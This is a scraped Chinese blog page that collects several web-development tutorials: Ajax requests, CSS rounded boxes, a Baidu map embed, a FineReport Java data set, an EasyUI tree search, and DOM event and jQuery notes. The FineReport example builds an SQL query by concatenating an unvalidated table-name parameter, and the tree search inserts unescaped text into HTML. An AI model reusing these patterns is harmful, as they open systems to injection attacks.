if ((city == null) || (city == "")) return;
if ((state == null) || (state == "")) return;
// Build the URL to connect to
var url = "/scripts/getZipCode.aspx?city=" + escape(city) + "&state=" + escape(state);
// Open a connection to the server
xmlHttp.open("GET", url, true);
// Setup a function for the server to run when it's done
xmlHttp.onreadystatechange = updatePage;
// Send the request
xmlHttp.send(null);
} 处理响应：readyState可能返回的值：0：请求未初始化（还没有调用 open()）。 1：请求已经建立，但是还没有发送（还没有调用 send()）。 2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。 3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。 4：响应已完成；您可以获取并使用服务器的响应了。 必须知道两点：1.什么也不要做，直到 xmlHttp.readyState 属性的值等于 4。 2.服务器将把响应填充到 xmlHttp.responseText 属性中。响应函数： function updatePage() {
  if (xmlHttp.readyState == 4) {
    var response = xmlHttp.responseText;
    document.getElementById("zipCode").value = response;
  }
} 开始的代码使用基本 JavaScript 代码获取几个表单字段的值。然后设置一个 asp 脚本作为链接的目标。要注意脚本 URL 的指定方式，city 和 state（来自表单）使用简单的 GET 参数附加在 URL 之后。 然后打开一个连接，这是您第一次看到使用 XMLHttpRequest。其中指定了连接方法（GET）和要连接的 URL。最后一个参数如果设为 true，那么将请求一个异步连接（这就是 Ajax 的由来）。如果使用 false，那么代码发出请求后将等待服务器返回的响应。如果设为 true，当服务器在后台处理请求的时候用户仍然可以使用表单（甚至调用其他 JavaScript 方法）。xmlHttp（要记住，这是 XMLHttpRequest 对象实例）的 onreadystatechange 属性可以告诉服务器在运行完成 后（可能要用五分钟或者五个小时）做什么。因为代码没有等待服务器，必须让服务器知道怎么做以便您能作出响应。在这个示例中，如果服务器处理完了请求，一个特殊的名为 updatePage() 的方法将被触发。最后，使用值 null 调用 send()。因为已经在请求 URL 中添加了要发送给服务器的数据（city 和 state），所以请求中不需要发送任何数据。这样就发出了请求，服务器按照您的要求工作。简单总结的Ajax的工作流程：javascript获得要向服务器段传递的参数或变量，然后利用创建的XMLHttpRequest 对象发送个服务器段，如果服务器端接受数据并返回数据，则保存在responseText 属性中，最后通过javascript修改DOM，从而实现在客户端无刷新的修改数据。 参考资料：http://www.ibm.com/developerworks/cn/xml/wa-ajaxintro1.html








window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];




上一篇Ajax优缺点解析
下一篇Ajax提高篇（2）DOM进行Web响应





    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)




顶
1


踩
0


纯CSS技术实现可变高度的圆角矩形框-so easy
    在上一篇的文章http://blog.csdn.net/wz537071/article/details/47910757#reply中，总结了下用纯CSS制作圆角矩形框的知识，并且最终做出来自己想要的那个样式。在网页设计中，还有很多的可变宽度的圆角矩形框的使用，一些网页不可能用一些固定宽度的圆角矩形框来显示内容，可变宽度的圆角矩形框的使用地位是很重要的，那么现在来扩展下思维，能不能用纯CSS的技术来制作可变宽度的圆角矩形框呢？答案就是可以，而且非常简单。
    在牛腩视频中，牛腩老师是通过截取一个现成的图片，然后通过5部分的方法设计的圆角矩形框，这种方法是对图片img的设计，跟着牛腩老师的步骤可以很好的实现这个样式。通过了解原理知道，可变宽度的圆角矩形框其实也是那个固定宽度的圆角矩形框的变形，视频上是通过把右边的边框进行平铺，最后实现的可变宽度：


    说说我自己的想法：在上一篇文章里面已经介绍了圆角矩形框的实现原理，最后我也实现了那个固定宽度的圆角矩形框，只要我可以把中间的那个<div>标签的左右边框的长度可以随文本变化的话，那就可以很方便的实现可变宽度的圆角矩形框了啊。
    带着这样的想法，通过1天时间的研究（过程苦逼略过），通过对比border的属性和查找资料，终于发现了border的一个重要属性：_width、_height。这个属性的意思是高度或宽度取决于其他属性的值。那要是这样的话，就可以实现我们的需求了。
    下面是我的具体设计过程（so easy只要你懂了原理）：
    把固定高度的圆角矩形框建立起来，过程同上一篇文章：
<!--可变高度的圆角矩形框的设计-HTML代码-->
    <div>
        <div id="categorycenter" class="divbox">
            <div class="div1"></div>
            <div class="div2"></div>
            <div  id="divmiddle">
                <p>类别管理</p>
                <p>新闻管理</p>
                <p>添加新闻</p>
            </div>
            <div class="div2"></div>
            <div class="div1"></div>
        </div>
    </div>
<div>

/*固定高度的圆角框的制作*/
.divbox {
    width: 580px;
    margin: auto;
    vertical-align: text-bottom;
}

.div1 {
    background: #999999;
    border-left: #999999 solid 3px;
    border-right: solid 3px #999;
    margin: 0px 6px;
    height: 3px;
    overflow: hidden;
}

.div2 {
    background: #FFF;
    border-left: #999999 solid 3px;
    border-right: solid 3px #999;
    margin: 0px 2px;
    height: 3px;
    overflow: hidden;
}

.divmiddle {
    height: 285px;
    border-left: #999999 solid 3px;
    border-right: solid 3px #999;
}
    接下来就是设置中间的divmiddle标签的边框的样式，让它可以改变高度：
/*可变高度的圆角矩形框-CSS代码*/
#categorycenter {
    float: left;
    _height: 200px;
    width: 200px;
    margin-bottom: 10px;
    border-image-repeat: repeat;
}

    #categorycenter p {
        text-align :center ;
        margin-top :20px;
        margin-bottom :35px;
    }

#divmiddle {
    border-left: 3px solid #999;
    border-right: 3px solid #999;
    _height:200px;
    overflow: hidden;
}

    注意上面的代码，在改变divmiddle标签的边框样式的时候，一定要首先明白它们都是放在了categorycenter这个大的标签下面的，所以首先要对这个标签进行重新设计，然后再进行divmiddle标签的边框设计，最终形成的效果就是下面的：


    改变p标签的样式，把间距变大一点，就是下面的图：


    通过与旁边的那个固定宽度的圆角矩形框的对比，可以清晰的看出来差别，这样也是对我们设计的一个效果的检验，嗯，效果很好值得肯定。
    在这个探索的过程中，由于出现了各种问题，不是文字出去了边框就是边框没有贴合在一块，大段大段的空白，没办法只有上，各种调试，各种实验，这个过程以后我对那些float、margin等这些属性的使用，从脑子里面转移到了手上，需要什么样式随手一打就是标准的样式（啊哈，开玩乐），就是这个过程我觉得是对知识的一种锤炼，最终能够验证自己的想法还是很有感觉的。



版权声明：本文为博主原创文章，未经博主允许不得转载。

百度地图引用

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script src="jquery-1.7.1.min.js"></script>
<script src="http://api.map.baidu.com/api?v=1.3" type="text/javascript"></script>
<script type="text/javascript" src="baidumap.js"></script>
<script type="text/javascript">
$(function(){
 
var lng = '117';
var lat = '120';
var hos = '浙江大学医学院附属邵逸夫医院';
$("#lookmap").attr("href", "http://map.baidu.com/?latlng="+lat+","+lng+"&title="+hos+"&content=&autoOpen=true");
MapUtil.init("map");

MapUtil.showLabel(lng, lat, hos);
var url = "http://map.baidu.com/?latlng="+lat+","+lng+"&title="+hos+"&content=&autoOpen=true";
MapUtil.addEventListener('click',function(){},url);
});
</script>
</head>


<body>
<!--主体页面底部-right-->
    <div class="yys-main-bottom-right">
         <div class="yys-main-bottom-right-map">
          <div id="map" style="width: 270px;height: 230px;"></div>
             <div><a href="#" id="lookmap" target="block">查看地图</a></div>
         </div>
     </div>  
</body>
</html>
    
        
版权声明：本文为博主原创文章，未经博主允许不得转载。

报表引擎API开发入门—带参程序数据集
我们今天又来讲讲报表开发的事，上周开的这个系列入门文章也三四天了，浏览量不佳小编甚是悲伤啊，希望大家多多支持我！
一、问题描述
在实际应用中，可能需要根据表名动态地改变数据源，比如在程序数据集中，通过传进的表名参数，到数据库取出对应的表作为数据源。因为FineReport是通过AbstractTableData抽象类来读取数据源的，而上述所有的数据来源都继承实现其抽象方法
，因此用户只要实现了AbstractTableData抽象类，也就可以用自定义类型的数据源了(程序数据集)，FineReport报表引擎就能够读取定义的数据源作为报表数据源使用。以下就对这种情况举例说明。
二、实现原理
与简单程序数据集相同，即继承AbstractTableData。大家可以参考我上次的文章。
三、实现步骤
3.1
定义参数
定义一个参数，并定义数据表结构，代码如下：
    public ParamTableDataDemo() {  
            // 定义tableName参数  
            this.parameters = new Parameter[] { new Parameter("tableName") };  
            // 定义程序数据集列名  
            columnNames = new String[columnNum];  
            for (int i = 0; i < columnNum; i++) {  
                columnNames[i] = "column#" + String.valueOf(i);  
            }  
        }  
3.2 设置数据
将数据放入到定义的表中，代码如下：
public void init() {
        // 确保只被执行一次
        if (valueList != null) {
            return;
        }
        // 保存得到的数据库表名
        String tableName = parameters[0].getValue().toString();
        // 构造SQL语句,并打印出来
        String sql = "select * from " + tableName + ";";
        FRContext.getLogger().info("Query SQL of ParamTableDataDemo: \n" + sql);
        // 保存得到的结果集
        valueList = new ArrayList();
        // 下面开始建立数据库连接，按照刚才的SQL语句进行查询
        Connection conn = this.getConnection();
        try {
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            // 获得记录的详细信息，然后获得总列数
            ResultSetMetaData rsmd = rs.getMetaData();
            colNum = rsmd.getColumnCount();
            // 用对象保存数据
            Object[] objArray = null;
            while (rs.next()) {
                objArray = new Object[colNum];
                for (int i = 0; i < colNum; i++) {
                    objArray[i] = rs.getObject(i + 1);
                }
                // 在valueList中加入这一行数据
                valueList.add(objArray);
            }
            // 释放数据库资源
            rs.close();
            stmt.close();
            conn.close();
            // 打印一共取到的数据行数量
         FRContext.getLogger().info(
                    "Query SQL of ParamTableDataDemo: \n" + valueList.size()+ " rows selected");
    } catch (Exception e) {
        e.printStackTrace();
    }
}
3.3
完整的数据集代码
完整的带参程序数据集的代码如下：
  package com.fr.data;
    import java.sql.Connection;
    import java.sql.DriverManager;
    import java.sql.ResultSet;
    import java.sql.ResultSetMetaData;
    import java.sql.Statement;
    import java.util.ArrayList;
    import com.fr.base.FRContext;
    import com.fr.data.AbstractTableData;
    import com.fr.base.Parameter;
    public class ParamTableDataDemo extends AbstractTableData {
    // 列名数组，保存程序数据集所有列名
    private String[] columnNames = null;
    // 定义程序数据集的列数量
    private int columnNum = 10;
    // 保存查询表的实际列数量
    private int colNum = 0;
    // 保存查询得到列值
    private ArrayList valueList = null;
    // 构造函数，定义表结构，该表有10个数据列，列名为column#0，column#1，。。。。。。column#9
    public ParamTableDataDemo() {
        // 定义tableName参数
        this.parameters = new Parameter[] { new Parameter("tableName") };
        // 定义程序数据集列名
        columnNames = new String[columnNum];
        for (int i = 0; i < columnNum; i++) {
            columnNames[i] = "column#" + String.valueOf(i);
        }
    }
    // 实现其他四个方法
    public int getColumnCount() {
        return columnNum;
    }
    public String getColumnName(int columnIndex) {
        return columnNames[columnIndex];
    }
    public int getRowCount() {
        init();
        return valueList.size();
    }
    public Object getValueAt(int rowIndex, int columnIndex) {
        init();
        if (columnIndex >= colNum) {
            return null;
        }
        return ((Object[]) valueList.get(rowIndex))[columnIndex];
    }
    // 准备数据
    public void init() {
        // 确保只被执行一次
        if (valueList != null) {
            return;
        }
        // 保存得到的数据库表名
        String tableName = parameters[0].getValue().toString();
        // 构造SQL语句,并打印出来
        String sql = "select * from " + tableName + ";";
        FRContext.getLogger().info("Query SQL of ParamTableDataDemo: \n" + sql);
        // 保存得到的结果集
        valueList = new ArrayList();
        // 下面开始建立数据库连接，按照刚才的SQL语句进行查询
        Connection conn = this.getConnection();
        try {
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            // 获得记录的详细信息，然后获得总列数
            ResultSetMetaData rsmd = rs.getMetaData();
            colNum = rsmd.getColumnCount();
            // 用对象保存数据
            Object[] objArray = null;
            while (rs.next()) {
                objArray = new Object[colNum];
                for (int i = 0; i < colNum; i++) {
                    objArray[i] = rs.getObject(i + 1);
                }
                // 在valueList中加入这一行数据
                valueList.add(objArray);
            }
            // 释放数据库资源
            rs.close();
            stmt.close();
            conn.close();
            // 打印一共取到的数据行数量
            FRContext.getLogger().info(
                    "Query SQL of ParamTableDataDemo: \n" + valueList.size()+ " rows selected");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    // 获取数据库连接 driverName和 url 可以换成您需要的
    public Connection getConnection() {
        String driverName = "sun.jdbc.odbc.JdbcOdbcDriver";
        String url = "jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=D:\\FineReport_7.0\\WebReport\\FRDemo.mdb";
        String username = "";
        String password = "";
        Connection con = null;
        try {
            Class.forName(driverName);
            con = DriverManager.getConnection(url, username, password);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
        return con;
    }
    // 释放一些资源，因为可能会有重复调用，所以需释放valueList，将上次查询的结果释放掉
    public void release() throws Exception {
        super.release();
        this.valueList = null;
    }
}
编译ParamTableDataDemo.java
，将生成的ParamTableDataDemo.class类文件拷贝到报表工程/WEB-INF/classes目录下。由于该类是在com.fr.data包中的，因此最终应该将该类放在/WEB-INF/classes/com/fr/data下面。此时该程序数据源便定义好了。
3.4
配置程序数据集
新建报表，在报表数据集中新建程序数据源，选择我们定义好的程序数据集，如下图，名字可以自定义，如divtable

3.5 使用程序数据集
配置好程序数据源后便可以使用定义的程序数据集了，选中该数据集点击预览按钮，即可以输入表名动态地获取相应的数据表，并制作模板，如下图




注：如果预览不出数据，请确认代码段里面定义数据库连接时URL的地址是否正确。
可以看到，我们已经将STSCORE表中的数据提取至程序数据集表中，像其他类型的数据集一样，可以通过拖拽方法实现单元格数据列绑定。
好啦今天就讲到这啦！今天的程序有点多，求关注，求推荐，求收藏。

 

版权声明：本文为博主原创文章，未经博主允许不得转载。

新手学EasyUI----EasyUI-Tree联想加模糊查询
最近做的项目中用到了EasyUI的Tree，树的结构是这样的，有22个车站，每一个车站相当于一个逻辑域（虚拟域），每一个域下有许多的设备类型，拿我现在做的门禁系统来说，设备类型有门禁主控制器和门禁就地控制器等设备类型，每一种设备类型下面会有多个设备，每一个车站可能会有好几十个设备，22个车站就可能会有上百个或者上千个设备，这样在加载成Tree后，比如说想要查看文锦站的A站口的门禁就地控制器的信息，要是让你一个节点一个节点的打开去找，肯定会烦死的，所以我们就做了一个（联想+模糊）查询。
一开始我们是按照这篇文章js/jQuery实现类似百度搜索功能做的，但是做出来之后会有一个很大的缺点，就是不能够复用，别人要是想用的话，必须得把整个代码再改一遍才能用，真得感谢我们的组长，一开始对于面向对象的思想重视的还是不够，但是面向对象是真的非常的重要，面向对象的核心思想就是抽象，一层一层的往上抽象，之前做项目的时候，许多的知识点都是其他人封装好了我们直接拿过来用的，有种被惯坏了的赶脚，真正的想要去深入的理解一种知识，就应该从它的根本抓起，把它的核心原理能够轻松的运用，这才是大牛的发展路，用别人封装好的东西，永远都是被别人牵着鼻子走，为什么不自己当个领路人呢？
咳咳~~扯远了，接着回来说查询的这个功能，每一棵Tree都跟着一个搜索框，想要能够达到复用的结果可以这么改，看代码：

'''Html部分'''
<%-- 查询 --%>
<div style="position: relative">
	<input id="kw" onkeyup="getContent(this,'myTree');" style="background-image:url('../Pictrue/搜索.png'); background-position:right; background-repeat:no-repeat; width: 195px;" />
	<div id="append" style="position: absolute; background-color: white;"></div>
</div>
接下来是javascript文件，很重要的哦~~好好找不同点！


'''javascript代码'''

var treeid;
var textid;
$(function () {
    //键盘事件
    $(document).keydown(function (e) {
        e = e || window.event;
        var keycode = e.which ? e.which : e.keyCode;
        //键盘Up事件
        if (keycode == 38) {
            if (jQuery.trim($("#append").html()) == "") {
                return;
            }
            movePrev();
            //键盘Down事件
        } else if (keycode == 40) {
            if (jQuery.trim($("#append").html()) == "") {
                return;
            }
            $("#"+textid).blur();
            if ($(".item").hasClass("addbg")) {
                moveNext();
            } else {
                $(".item").removeClass('addbg').eq(0).addClass('addbg');
            }
            //键盘回车Enter
        } else if (keycode == 13) {
            dojob();
        }
    });

    //向上移动
    var movePrev = function () {
        $("#" + textid).blur();
        var index = $(".addbg").prevAll().length;
        if (index == 0) {
            $(".item").removeClass('addbg').eq($(".item").length - 1).addClass('addbg');
        } else {
            $(".item").removeClass('addbg').eq(index - 1).addClass('addbg');
        }
    }
    //向下移动
    var moveNext = function () {
        var index = $(".addbg").prevAll().length;
        if (index == $(".item").length - 1) {
            $(".item").removeClass('addbg').eq(0).addClass('addbg');
        } else {
            $(".item").removeClass('addbg').eq(index + 1).addClass('addbg');
        }

    }

    //公共方法
    var dojob = function () {

        $("#" + textid).blur();     //失去焦点事件
        var node = $("#" + treeid).tree('getChildren');    //获取Tree的所有节点
        $("#" + treeid).tree('expandAll', node.target);    //展开所有节点
        var value = $(".addbg").text();        //获取文本框输入的内容

        //查找相应节点并滚动到该节点，高亮显示
        for (i = 0; i < node.length; i++) {
            var treeId = node[i].id;
            var treeName = node[i].text;
            //找到相应的设备
            if (treeName.indexOf(value) >= 0) {
                if (treeName==value) {
                    var nodes = $("#" + treeid).tree('find', treeId);   //找到当前的节点
                    $("#" + treeid).tree('scrollTo', nodes.target);     //滚动到当前节点
                    $("#" + treeid).tree('select', nodes.target);       //高亮显示
                }
                
            }
        }
        $("#" + textid).val(value);    //将选择的设备显示到搜索框中
        $("#append").hide().html("");   //隐藏下拉框

    }

});
//输入事件
function getContent(obj,idtree) {
    treeid = idtree;
    
    textid = obj.id;
    //获取tree的所有节点
    var nodes = $("#"+treeid).tree('getChildren');
    //获取输入的值
    var kw = jQuery.trim($(obj).val());
    if (kw == "") {
        $("#append").hide().html("");
        return false;
    }
    var html = "";
    //匹配并动态加载到下拉框中
    for (i = 0; i < nodes.length; i++) {
        var treeId = nodes[i].id;
        var treeName = nodes[i].text;

        if (treeName.indexOf(kw) >= 0) {
            //动态加载下拉框和数据
            html = html + "<div style='width:200px;' class='item' onmouseenter='getFocus(this)' onClick='getCon(this,treeid);'>" + treeName + "</div>";
        }
    }
    if (html != "") {
        $("#append").show().html(html);
    } else {
        $("#append").hide().html("");
    }
}
//获取焦点事件
function getFocus(obj) {
    $(".item").removeClass("addbg");
    $(obj).addClass("addbg");
}
//单击事件
function getCon(obj, treeid) {
    $("#" + textid).blur();     //失去焦点事件
    var node = $("#" + treeid).tree('getChildren');    //获取Tree的所有节点
    $("#" + treeid).tree('expandAll', node.target);    //展开所有节点
    var value = $(obj).text();        //获取文本框输入的内容

    //查找相应节点并滚动到该节点，高亮显示
    for (i = 0; i < node.length; i++) {
        var treeId = node[i].id;
        var treeName = node[i].text;
        //找到相应的设备
        if (treeName.indexOf(value) >= 0) {
            if (treeName == value) {
                var nodes = $("#" + treeid).tree('find', treeId);   //找到当前的节点
                $("#" + treeid).tree('scrollTo', nodes.target);     //滚动到当前节点
                $("#" + treeid).tree('select', nodes.target);       //高亮显示
            }
        }
    }
    $("#" + textid).val(value);    //将选择的设备显示到搜索框中
    $("#append").hide().html("");   //隐藏下拉框
}
在外面工作，收获是很大的，之前做项目，许多的东西都是别人封装好，咱们直接拿过来用，再怎么找也没有自己去从头到尾研究一边来的透彻，现在工作了，项目刚开始做，工作量还是很大的，不过能学到的知识也是很多的，有苦才有甜嘛！





转载请注明出处：http://blog.csdn.net/zlts000/article/details/47959173

版权声明：本文为博主原创文章，未经博主允许不得转载。

Jquery实现超酷的时间轴特效


原文：Jquery实现超酷的时间轴特效

源代码下载地址：http://www.zuidaima.com/share/1607123657378816.htm




版权声明：本文为博主原创文章，未经博主允许不得转载。

浅谈WEB标准
WEB标准，WEB标准，可亲可爱的WEB，什么是你定下的标准呢。这几天又重新回归最基础的知识了，OK，言归正传，什么是WEB标准，为什么要用WEB标准？
比如说，现在的浏览器版本多吧，chrome，Safari，IE，firefox等等，版本多，问题就来了，怎么统一呀，中国有句老话有时候还是有道理的，“没有规矩，不成方圆”，每个WEB开发者如果各有各的标准，你写的我看不懂，我写的你看不懂，这不就乱套了，网站怎么维护呢。换方面来说，作为web开发者，还得费脑子想，诶，我要用什么标准？再换者说，web怎么更好的识别呢，是吧，各种问题，锵锵锵都出现了。
这个时候，web 标准出现了，
——“咳咳咳，为了web更好的发展，为了确保每个人都有权利访问相同的信息，为了拯救挣扎于多版本开发的web攻城狮，我，web标准，简化团队协作，增加网站流量，咳咳咳，就是这样……“。
通俗来说，web标准是一个标准的集合，而不是某一个标准。web，就是网页，三部分组成：结构，表现，行为，就好像人似的，结构相当于人的骨骼组织架构血液等等，表现相当于这个人的长相，行为就是这个人的行为，不过这个人的名字叫WEB。对应的web 标准：结构化标准语言（主要包括XHTML和XML），表现标准语言（主要包括CSS），行为标准（主要包括文档对象模型DOM，ECMAScript等），相当于现在对人也有一个评判标准，比如说黄金比例什么的。
代码的部分标准可以看我之前的博客——前端之代码规范总结，一个代码规范，仅供参考。
简单说了下WEB标准，也帮助自己更好的理解吧，百度百科里写的也比较完整的，如有更深刻的理解，多多分享交流哈，个人认识的还是不够全面。





版权声明：本文为博主原创文章，未经博主允许不得转载。

DOM Level 2 Event与jQuery源码：捕获与冒泡

本文中的JavaScript事件是指：在浏览器中，DOM标准提供的JavaScript事件集与接口集。


在项目开发中通常会使用类似jQuery的工具来绑定事件处理函数， 也可以设置捕获，或者中断事件流，正如这篇文章锁讨论的： jQuery事件：bind、delegate、on的行为与性能。
 本文来讨论DOM标准中是如何规定这些JavaScript事件的，以及jQuery源码中DOM事件的实现方式。

JavaScript 事件

首先我们来回顾一下DOM事件的行为，事件从发生开始经历了三个阶段：

捕捉阶段（capture phase）：从最上层元素，直到最下层（你点击的那个target）元素。路过的所有节点都可以捕捉到该事件。命中阶段（target phase）：如果该事件成功到达了target元素，它会进行事件处理。冒泡阶段（bubbling phase）：事件从最下层向上传递，依次触发父元素的该事件处理函数。

如何中断事件传播，以及禁止事件发生时的浏览器默认行为，参考：jQuery事件：bind、delegate、on的行为与性能



图片来源：http://www.w3.org/TR/DOM-Level-3-Events/#dom-event-architecture

DOM标准中，定义了一系列的JavaScript事件，以及事件接口。其中，DOM Level 0 Event提供了类似onclick的属性来支持事件，
 DOM Level 2 Event提供了addEventListener, removeEventListener, dispatchEvent，还有IE<9的attachEvent。

两种事件处理模型的区别在于，

前者（onclick）是一次性的事件处理，而且是通过操作DOM元素的属性来完成，因而只能绑定一个处理函数。后者（addEventListener）更加高级，不仅可以添加多个事件处理函数，还支持事件的捕获。

DOM Level 0 Event

DOM Level 0 Event从Netscape浏览器开始就有支持，最初是通过在HTML中写入onclick属性来完成事件绑定：

<div onclick="clickHandler()"></div>
<script>
function clickHandler(){
    console.log('clicked');
}
</script>



后来随着Web技术的进步，我们可以在JavaScript定义并且绑定事件了。此后我们可以做到事件处理和页面展示的分离， 在不支持JavaScript的浏览器中，以及搜索引擎看来，页面变得更加地兼容。请看：

document.getElementById("#foo").onclick = function(){
    console.log('clicked');
}



即时支持在JS中绑定事件，DOM Level 0 事件也存在一些问题。例如：

var el = document.getElementById("#foo");
el.onclick = function(){
    console.log('clicked 1');
}
el.onclick = function(){
    console.log('clicked 2');
}



是因为el.onclick的本质是对DOM元素属性的赋值，后一次时间绑定会使得前一次事件绑定失效。

addEventListener

2000年11月，W3C发布了DOM (Document Object Model) Level 2 Event，提供了更复杂的事件处理模型：

el.addEventListener("click", func, false);



在版本小于9的IE中，通过attachEvent来添加事件处理函数。然而从IE11开始，attachEvent已经不受支持，天煞的IE啊：

MSDN
 attachEvent: AttachEvent is no longer supported. Starting with Internet Explorer 11, use addEventListener.


通过addEventListener添加任意多个事件处理函数，第三个参数用来设置是否捕获（请看下一节）来自子元素的事件，默认为false。

el.addEventListener("click", function(){
    console.log('clicked 1');
});

el.addEventListener("click", function(){
    console.log('clicked 2');
});



这样，两个事件处理函数都会得到执行。

removeEventListener

DOM Level 2 Event还提供了removeEventListener(type,
 listener[, useCapture])方法，用来移除事件处理函数。 callback是必选参数！capture默认值为false：

如果同一个监听事件分别为“事件捕获”和“事件冒泡”注册了一次，一共两次，这两次事件需要分别移除。两者不会互相干扰。


var div = document.getElementById('div');
var listener = function (event) {
  /* do something here */
};
div.addEventListener('click', listener, false);
div.removeEventListener('click', listener, false);



捕获与冒泡

本文最开始已经给出了事件处理的三个阶段：捕获、目标、冒泡。在DOM Level 2 Event中， 如果addEventListener第三个参数为true则为添加捕获阶段的事件处理函数，否则为添加冒泡阶段的事件处理函数。

如果当前对象就是目标对象本身时，添加的事件处理函数只在目标阶段起作用，第三个参数无效。


来看例子吧：

<div id="l1">
  <div id="l2"></div>
</div>

<script type="text/javascript">
  var l1 = document.getElementById('l1'), l2 = document.getElementById('l2');

  l1.addEventListener('click', function(){ console.log('l1 capture')}, true);

  l1.addEventListener('click', function(){ console.log('l1 bubbling')});

  l2.addEventListener('click', function(){ console.log('l2 target')});

  l2.addEventListener('click', function(){ console.log('l2 target, invalid capture')}, true);
</script>



为元素l1添加了一个捕获阶段的处理函数l1
 captured，一个冒泡阶段的处理函数l1
 bubbling。为l2添加了一个目标阶段的事件处理函数。
 运行结果是：

l1 capture
l2 target
l2 target, invalid capture
l1 bubbling



其中，l2 target, invalid
 capture设置了捕获，但因为当前对象就是目标对象，捕获无效。该函数仍然作用于目标阶段。 既然捕获失效，那么它的执行顺序就按照注册事件的顺序了，不会因为它设置了无效的捕获而提前得到执行。

DispatchEvent

target.DispatchEvent(event)也是DOM
 Level 2 Event提供的方法。用来从target开始分发事件event。
 例如，我们可以创建一个clickDOM事件：

var event = new MouseEvent('click', {
  view: window,
  bubbles: true,
  cancelable: true
});
l2.dispatchEvent(event);



会产生与点击完全相同的输出：

l1 capture
l2 target
l2 target, invalid capture
l1 bubbling



如果用l1来dispatchEvent会怎样？

l1 capture
l1 bubbling



因为l1确实拥有子元素，所以事件仍然会下行和冒泡。但事件的target并非l2，所以l2不会触发目标阶段的事件处理函数。

jQuery Event 源码

好了好了，DOM Level 2 Event的事件处理模型算是清楚了，在DOM Level 3 Event的Working Draft中， 仍然沿袭了三阶段的事件处理流程。接着我们来看jQuery的那些事件处理函数是怎样实现的。

我们知道，jQuery中的bind, delegate, live等最终都是通过.on()来实现的。来看它的声明：

.on( events [, selector ] [, data ], handler )



events可以是多个事件，空格分隔；如果指定了selector，当前事件处理函数将会代理源于selector的事件；如果指定了data，它将会通过event.data传递。

这个selector是在当前元素的上下文中查找的，见jquery-2.1-stable/src/event.js第434行： jQuery(
 sel, this ).index( cur ) >= 0。


on方法定义在jquery-2.1-stable/src/event.js中（766行），
 最终调用addEventListener方法（122行）来添加事件处理函数：

add: function(elem, types, handler, data, selector){
  ...
  if(elem.addEventListener) {
    elem.addEventListener(type, eventHandle, false);
  }
  ...
}



在2.1版本中已经找不到attachEvent方法了，jQuery放弃了版本<9的IE。。
 不过在旧版本的jQuery中，仍然可以看到对IE的支持。例如在jquery-1.11-stable/src/events.js中：

if (elem.addEventListener) {
  elem.addEventListener(type, eventHandle, false);
}else if (elem.attachEvent) {
  elem.attachEvent("on" + type, eventHandle);
}



另外值得注意的是，jQuery的on方法实现中，addEventListener的第三个参数总是false。
 即jQuery事件代理是借助事件冒泡实现的，并未使用事件捕获机制。

再看与on对应的.off()，它的声明为：

.off( events [, selector ] [, handler ] )



events可以是多个事件，空格分隔；selector用来移除对某个子元素的代理；handler用来指定要移除的处理函数，不指定则移除所有。

off方法的实现在jquery-2.1-stable/src/event.js822行，最终调用removeEventListener方法（619行）来移除事件处理函数：

jQuery.removeEvent = function(elem, type, handle){
    if(elem.removeEventListener) {
        elem.removeEventListener(type, handle, false);
    }
};



注意这里设置了第三个参数为false，因为on绑定的都是非捕获事件处理函数，自然off也只需要移除非捕获的事件处理函数。


除非注明，本博客文章均为原创，转载请以链接形式标明本文地址： http://harttle.com/2015/07/31/javascript-event.html


版权声明：本文为博主原创文章，转载请附上原文链接。

jQeury入门：遍历
一旦用jQuery创建一个初始的包装集，你就能深度遍历刚刚选择的包装集。遍历可以被分为三个基础元件：父级，子级，同级。jQuery为所有这些元件提供丰富易用的方法。注意每一个方法都能轻易的传递给字符串选择器，有一些甚至能够用另外的jQuery对象来过滤你的包装集。关注和参考API documentation on traversing来弄懂你有什么变化的参数可用。
父级
从包装集中寻找父级元素的方法包括.parent(), .parents(), .parentsUntil(), 和 .closest()。
    <div class="grandparent">
        <div class="parent">
            <div class="child">
                <span class="subchild"></span>
            </div>
        </div>
        <div class="surrogateParent1"></div>
        <div class="surrogateParent2"></div>
    </div>

    // 选择一个元素的直系父级元素：

    // returns [ div.child ]
    $( "span.subchild" ).parent();

    //  选择一个元素的所有匹配给定选择器的父级元素
    // returns [ div.parent ]
    $( "span.subchild" ).parents( "div.parent" );

    // returns [ div.child, div.parent, div.grandparent ]
    $( "span.subchild" ).parents();

    //选择一个元素的除了选择器中的元素以外的所有的父级元素：
    // returns [ div.child, div.parent ]
    $( "span.subchild" ).parentsUntil( "div.grandparent" );

    // 选择最靠近的父级元素，注意只有一个父级元素被选中，并且初始元素本身也包含在被搜索的元素中：

    // returns [ div.child ]
    $( "span.subchild" ).closest( "div" );

    // 返回[ div.child ] ，因为选择器包含在被搜索的元素中：
    $( "div.child" ).closest( "div" );
子级
从包装集中寻找子级元素的方法包括 .children() and .find()。这两个方法之间的区别在于距离创建的包装集的子结构有多远。.children()仅仅操作直系的子节点，而.find()可以循环遍历子节点，这些子节点的子节点，以此类推。
    // 选择元素直系的子节点   

    // returns [ div.parent, div.surrogateParent1, div.surrogateParent2 ]
    $( "div.grandparent" ).children( "div" );

    // 在包装集中，查找所有匹配选择器的元素 
    // returns [ div.child, div.parent, div.surrogateParent1, div.surrogateParent2 ]
    $( "div.grandparent" ).find( "div" );
同级
